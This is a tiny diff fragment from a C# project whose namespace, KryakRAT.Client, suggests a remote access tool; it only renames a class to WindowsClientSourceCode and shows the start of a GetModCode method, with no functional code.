@@ -2,7 +2,7 @@
 
 namespace KryakRAT.Client
 {
-    internal class ClientSourceCode
+    internal class WindowsClientSourceCode
     {
         public static string GetModCode()
         {
